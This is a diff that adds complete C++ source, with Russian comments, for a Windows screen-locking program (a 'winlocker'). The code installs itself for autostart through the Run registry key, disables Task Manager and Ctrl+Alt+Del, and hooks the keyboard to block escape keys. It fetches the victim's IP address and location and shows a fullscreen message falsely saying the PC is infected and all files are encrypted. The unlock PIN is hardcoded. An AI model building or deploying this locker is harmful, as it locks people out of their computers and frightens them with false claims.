@@ -1,1 +1,499 @@
-[TRUNCATED_BASE64]
+#include <windows.h>
+#include <string>
+#include <cstdlib>
+#include <ctime>
+#include <vector>
+#include <wininet.h>
+
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "user32.lib")
+#pragma warning(disable: 4996)
+
+using namespace std;
+
+bool blockKeys = true;
+HHOOK keyboardHook = NULL;
+
+// Добавляем в автозагрузку
+void AddToStartup() {
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        for (int i = 1; i <= 8; i++) {
+            string valueName = "WIN32_" + to_string(i);
+            RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, (BYTE*)exePath, (DWORD)strlen(exePath) + 1);
+        }
+        RegCloseKey(hKey);
+    }
+}
+
+// ПОЛНОЕ ВОССТАНОВЛЕНИЕ СИСТЕМЫ
+void FullSystemRestore() {
+    HKEY hKey;
+    
+    // 1. Удаляем все записи автозагрузки WIN32_1...WIN32_8
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        for (int i = 1; i <= 8; i++) {
+            string valueName = "WIN32_" + to_string(i);
+            RegDeleteValueA(hKey, valueName.c_str());
+        }
+        RegCloseKey(hKey);
+    }
+    
+    // 2. Удаляем специфические записи из Run
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "WindowsInstaller");
+        RegDeleteValueA(hKey, "MSEDeplUpdateX");
+        RegDeleteValueA(hKey, "WindowsSecurityUpdate");
+        RegCloseKey(hKey);
+    }
+    
+    // 3. Очищаем RunOnce
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "System3264Wow");
+        RegDeleteValueA(hKey, "OneDrive10293");
+        RegDeleteValueA(hKey, "WINDOWS");
+        RegDeleteValueA(hKey, "Shell");
+        RegCloseKey(hKey);
+    }
+    
+    // 4. Очищаем Winlogon
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "Shell");
+        RegCloseKey(hKey);
+    }
+    
+    // 5. Очищаем Explorer RunMRU
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "MRUList");
+        RegCloseKey(hKey);
+    }
+    
+    // 6. Удаляем сам файл программы
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    string batPath = string(tempPath) + "_cleanup.bat";
+    
+    FILE* bat = fopen(batPath.c_str(), "w");
+    if (bat) {
+        fprintf(bat, "@echo off\n");
+        fprintf(bat, "timeout /t 2 /nobreak > nul\n");
+        fprintf(bat, "del /f /q \"%s\"\n", exePath);
+        fprintf(bat, "del /f /q \"%s\"\n", batPath.c_str());
+        fclose(bat);
+        ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_HIDE);
+    }
+    
+    // 7. Запускаем Explorer
+    ShellExecuteA(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOWNORMAL);
+}
+
+void DisableCtrlAltDel() {
+    HKEY hKey;
+    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
+    DWORD value = 1;
+    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
+    RegCloseKey(hKey);
+    
+    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
+    DWORD disableCAD = 1;
+    RegSetValueExA(hKey, "DisableCAD", 0, REG_DWORD, (BYTE*)&disableCAD, sizeof(DWORD));
+    RegCloseKey(hKey);
+}
+
+void EnableCtrlAltDel() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "DisableTaskMgr");
+        RegCloseKey(hKey);
+    }
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "DisableCAD");
+        RegCloseKey(hKey);
+    }
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && blockKeys) {
+        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
+        
+        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+        if ((p->vkCode == VK_TAB) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+        if ((p->vkCode == VK_F4) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) return 1;
+        if ((p->vkCode == VK_ESCAPE) && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1;
+        if ((p->vkCode == VK_ESCAPE) && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) return 1;
+        if (p->vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+string GetRealIP() {
+    HINTERNET hNet = InternetOpenA("IPChecker", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hNet) return "Не удалось определить";
+    HINTERNET hUrl = InternetOpenUrlA(hNet, "http://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hUrl) {
+        InternetCloseHandle(hNet);
+        return "Не удалось определить";
+    }
+    char buffer[32] = {0};
+    DWORD bytesRead = 0;
+    InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead);
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hNet);
+    string ip = buffer;
+    return ip.empty() ? "Не удалось определить" : ip;
+}
+
+string GetGeoLocation(const string& ip) {
+    if (ip == "Не удалось определить") return "Неизвестно";
+    HINTERNET hNet = InternetOpenA("GeoChecker", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hNet) return "Неизвестно";
+    string url = "http://ip-api.com/json/" + ip + "?fields=country,city,isp";
+    HINTERNET hUrl = InternetOpenUrlA(hNet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hUrl) {
+        InternetCloseHandle(hNet);
+        return "Неизвестно";
+    }
+    char buffer[1024] = {0};
+    DWORD bytesRead = 0;
+    InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead);
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hNet);
+    string response = buffer;
+    string country, city, isp;
+    size_t pos = response.find("\"country\":\"");
+    if (pos != string::npos) {
+        pos += 11;
+        size_t end = response.find("\"", pos);
+        country = response.substr(pos, end - pos);
+    }
+    pos = response.find("\"city\":\"");
+    if (pos != string::npos) {
+        pos += 8;
+        size_t end = response.find("\"", pos);
+        city = response.substr(pos, end - pos);
+    }
+    pos = response.find("\"isp\":\"");
+    if (pos != string::npos) {
+        pos += 7;
+        size_t end = response.find("\"", pos);
+        isp = response.substr(pos, end - pos);
+    }
+    if (country.empty() && city.empty()) return "Неизвестно";
+    return country + ", " + city + " (" + isp + ")";
+}
+
+const vector<string> asciiArt = {
+    "             ;::::;           ",
+    "           ;::::; :;          ",
+    "         ;:::::'   :;         ",
+    "        ;:::::;     ;.        ",
+    "       ,:::::'       ;           OOO\\   ",
+    "       ::::::;       ;          OOOOO\\  ",
+    "       ;:::::;       ;         OOOOOOOO ",
+    "      ,;::::::;     ;'         / OOOOOOO ",
+    "    ;:::::::::`. ,,,;.        /  / DOOOOOO ",
+    "  .';:::::::::::::::::;,     /  /     DOOOO ",
+    " ,::::::;::::::;;;;::::;,   /  /        DOOO ",
+    ";`::::::`'::::::;;;::::: ,#/  /          DOOO ",
+    ":`:::::::`;::::::;;::: ;::#  /            DOOO ",
+    "::`:::::::`;:::::::: ;::::# /              DOO ",
+    "`:`:::::::`;:::::: ;::::::#/               DOO ",
+    ":::`:::::::`;; ;:::::::::##                OO ",
+    "::::`:::::::`;::::::::;:::#                OO ",
+    "`:::::`::::::::::::;'`:;::#                O  ",
+    "  `:::::`::::::::;' /  / `:#               ",
+    "   ::::::`:::::;'  /  /   `#               "
+};
+
+void FlashScreen() {
+    HDC hdc = GetDC(NULL);
+    RECT rect;
+    GetWindowRect(GetDesktopWindow(), &rect);
+    for (int i = 0; i < 3; i++) {
+        HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
+        FillRect(hdc, &rect, whiteBrush);
+        DeleteObject(whiteBrush);
+        Sleep(30);
+        HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
+        FillRect(hdc, &rect, redBrush);
+        DeleteObject(redBrush);
+        Sleep(30);
+    }
+    ReleaseDC(NULL, hdc);
+}
+
+LRESULT CALLBACK AnimationWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    static int currentLine = 0;
+    static HFONT hFont = NULL;
+    
+    switch (msg) {
+        case WM_CREATE: {
+            hFont = CreateFontA(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
+                                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, 
+                                CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, 
+                                DEFAULT_PITCH | FF_DONTCARE, "Consolas");
+            SetTimer(hwnd, 1, 60, NULL);
+            return 0;
+        }
+        
+        case WM_PAINT: {
+            PAINTSTRUCT ps;
+            HDC hdc = BeginPaint(hwnd, &ps);
+            RECT rect;
+            GetClientRect(hwnd, &rect);
+            
+            HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
+            FillRect(hdc, &rect, blackBrush);
+            DeleteObject(blackBrush);
+            
+            SetTextColor(hdc, RGB(255, 0, 0));
+            SetBkMode(hdc, TRANSPARENT);
+            if (hFont) SelectObject(hdc, hFont);
+            
+            RECT textRect;
+            textRect.left = 50;
+            textRect.top = rect.bottom / 4;
+            textRect.right = rect.right - 50;
+            textRect.bottom = rect.bottom;
+            
+            string fullArt;
+            for (int i = 0; i <= currentLine && i < (int)asciiArt.size(); i++) {
+                fullArt += asciiArt[i] + "\n";
+            }
+            DrawTextA(hdc, fullArt.c_str(), -1, &textRect, DT_LEFT | DT_WORDBREAK);
+            EndPaint(hwnd, &ps);
+            return 0;
+        }
+        
+        case WM_TIMER: {
+            if (currentLine < (int)asciiArt.size() - 1) {
+                currentLine++;
+                InvalidateRect(hwnd, NULL, TRUE);
+                UpdateWindow(hwnd);
+            } else {
+                KillTimer(hwnd, 1);
+                DestroyWindow(hwnd);
+            }
+            return 0;
+        }
+        
+        case WM_DESTROY: {
+            if (hFont) DeleteObject(hFont);
+            PostQuitMessage(0);
+            return 0;
+        }
+        default:
+            return DefWindowProc(hwnd, msg, wParam, lParam);
+    }
+}
+
+LRESULT CALLBACK LockerWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    static HWND hEdit, hButton;
+    static HFONT hMainFont, hTextFont, hInputFont;
+    static string userIP, userGeo;
+    
+    switch (msg) {
+        case WM_CREATE: {
+            userIP = GetRealIP();
+            userGeo = GetGeoLocation(userIP);
+            
+            SetWindowLongPtr(hwnd, GWL_STYLE, WS_POPUP);
+            ShowWindow(hwnd, SW_MAXIMIZE);
+            
+            HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
+            SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)blackBrush);
+            
+            HMENU hMenu = GetSystemMenu(hwnd, FALSE);
+            if (hMenu) {
+                EnableMenuItem(hMenu, SC_CLOSE, MF_GRAYED);
+                EnableMenuItem(hMenu, SC_MOVE, MF_GRAYED);
+                EnableMenuItem(hMenu, SC_MINIMIZE, MF_GRAYED);
+                EnableMenuItem(hMenu, SC_MAXIMIZE, MF_GRAYED);
+            }
+            
+            hMainFont = CreateFontW(96, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
+                                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
+                                    CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+                                    DEFAULT_PITCH | FF_DONTCARE, L"MS Gothic");
+            
+            hTextFont = CreateFontW(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
+                                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
+                                    CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+                                    DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
+            
+            hInputFont = CreateFontW(36, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
+                                     DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
+                                     CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+                                     DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
+            
+            int sw = GetSystemMetrics(SM_CXSCREEN);
+            
+            HWND hTitle = CreateWindowW(L"STATIC", L"!!! ВНИМАНИЕ !!!",
+                WS_VISIBLE | WS_CHILD | SS_CENTER,
+                0, 50, sw, 120, hwnd, NULL, NULL, NULL);
+            SendMessage(hTitle, WM_SETFONT, (WPARAM)hMainFont, TRUE);
+            
+            wstring message = 
+                L"\n[ СИСТЕМА ЗАБЛОКИРОВАНА ]\n\n"
+                L"Ваш компьютер заражён вирусом \"СПИД\"\n"
+                L"Все файлы зашифрованы\n\n"
+                L"════════════════════════════════════════\n\n"
+                L"IP: " + wstring(userIP.begin(), userIP.end()) + L"\n"
+                L"ЛОКАЦИЯ: " + wstring(userGeo.begin(), userGeo.end()) + L"\n\n"
+                L"════════════════════════════════════════\n\n"
+                L"ДЛЯ РАЗБЛОКИРОВКИ ВВЕДИТЕ ПИН-КОД:\n";
+            
+            HWND hText = CreateWindowW(L"STATIC", message.c_str(),
+                WS_VISIBLE | WS_CHILD | SS_CENTER,
+                50, 180, sw - 100, 400, hwnd, NULL, NULL, NULL);
+            SendMessage(hText, WM_SETFONT, (WPARAM)hTextFont, TRUE);
+            
+            hEdit = CreateWindowW(L"EDIT", L"",
+                WS_VISIBLE | WS_CHILD | WS_BORDER | ES_CENTER | ES_PASSWORD,
+                sw / 2 - 150, 580, 300, 60, hwnd, (HMENU)1001, NULL, NULL);
+            SendMessage(hEdit, WM_SETFONT, (WPARAM)hInputFont, TRUE);
+            
+            hButton = CreateWindowW(L"BUTTON", L"[ РАЗБЛОКИРОВАТЬ ]",
+                WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                sw / 2 - 120, 670, 240, 60, hwnd, (HMENU)1002, NULL, NULL);
+            SendMessage(hButton, WM_SETFONT, (WPARAM)hInputFont, TRUE);
+            
+            AddToStartup();
+            DisableCtrlAltDel();
+            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
+            
+            SetForegroundWindow(hwnd);
+            SetFocus(hwnd);
+            
+            return 0;
+        }
+        
+        case WM_CTLCOLORSTATIC: {
+            HDC hdcStatic = (HDC)wParam;
+            SetTextColor(hdcStatic, RGB(255, 0, 0));
+            SetBkColor(hdcStatic, RGB(0, 0, 0));
+            SetBkMode(hdcStatic, TRANSPARENT);
+            return (LRESULT)GetStockObject(NULL_BRUSH);
+        }
+        
+        case WM_CTLCOLOREDIT: {
+            HDC hdcEdit = (HDC)wParam;
+            SetTextColor(hdcEdit, RGB(255, 255, 255));
+            SetBkColor(hdcEdit, RGB(30, 0, 0));
+            return (LRESULT)CreateSolidBrush(RGB(30, 0, 0));
+        }
+        
+        case WM_CTLCOLORBTN: {
+            HDC hdcBtn = (HDC)wParam;
+            SetTextColor(hdcBtn, RGB(255, 0, 0));
+            SetBkColor(hdcBtn, RGB(20, 0, 0));
+            return (LRESULT)CreateSolidBrush(RGB(20, 0, 0));
+        }
+        
+        case WM_COMMAND: {
+            if (LOWORD(wParam) == 1002) {
+                wchar_t buffer[10];
+                GetWindowTextW(hEdit, buffer, 10);
+                wstring pin = buffer;
+                
+                // НОВЫЙ ПИН-КОД: 386893
+                if (pin == L"386893") {
+                    blockKeys = false;
+                    if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
+                    EnableCtrlAltDel();
+                    FullSystemRestore();
+                    DestroyWindow(hwnd);
+                } else {
+                    FlashScreen();
+                    MessageBoxW(hwnd, L"НЕВЕРНЫЙ ПИН-КОД!", 
+                                L"ОШИБКА", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+                    SetWindowTextW(hEdit, L"");
+                    SetFocus(hEdit);
+                }
+                return 0;
+            }
+            break;
+        }
+        
+        case WM_CLOSE:
+            return 0;
+            
+        case WM_DESTROY: {
+            DeleteObject(hMainFont);
+            DeleteObject(hTextFont);
+            DeleteObject(hInputFont);
+            PostQuitMessage(0);
+            return 0;
+        }
+        default:
+            return DefWindowProc(hwnd, msg, wParam, lParam);
+    }
+    return 0;
+}
+
+int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
+    srand(static_cast<unsigned int>(time(nullptr)));
+    
+    // Задержка 3 секунды для теста (поменяй на 60 + rand()%61)
+    int delaySeconds = 3;
+    Sleep(delaySeconds * 1000);
+    
+    // АНИМАЦИЯ
+    WNDCLASSEXW wcAnim = {};
+    wcAnim.cbSize = sizeof(WNDCLASSEXW);
+    wcAnim.lpfnWndProc = AnimationWndProc;
+    wcAnim.hInstance = hInstance;
+    wcAnim.lpszClassName = L"AnimationClass";
+    wcAnim.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
+    RegisterClassExW(&wcAnim);
+    
+    HWND hwndAnim = CreateWindowExW(
+        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
+        L"AnimationClass", L"", WS_POPUP,
+        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+        NULL, NULL, hInstance, NULL);
+    
+    ShowWindow(hwndAnim, SW_SHOW);
+    UpdateWindow(hwndAnim);
+    
+    MSG msg = {};
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    // ВИНЛОКЕР
+    WNDCLASSEXW wcLock = {};
+    wcLock.cbSize = sizeof(WNDCLASSEXW);
+    wcLock.lpfnWndProc = LockerWndProc;
+    wcLock.hInstance = hInstance;
+    wcLock.lpszClassName = L"LockerClass";
+    wcLock.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
+    wcLock.hIcon = LoadIcon(NULL, IDI_ERROR);
+    wcLock.hCursor = LoadCursor(NULL, IDC_ARROW);
+    RegisterClassExW(&wcLock);
+    
+    HWND hwndLock = CreateWindowExW(
+        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
+        L"LockerClass", L"", WS_POPUP,
+        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+        NULL, NULL, hInstance, NULL);
+    
+    ShowWindow(hwndLock, SW_SHOW);
+    UpdateWindow(hwndLock);
+    SetForegroundWindow(hwndLock);
+    
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    return 0;
+}
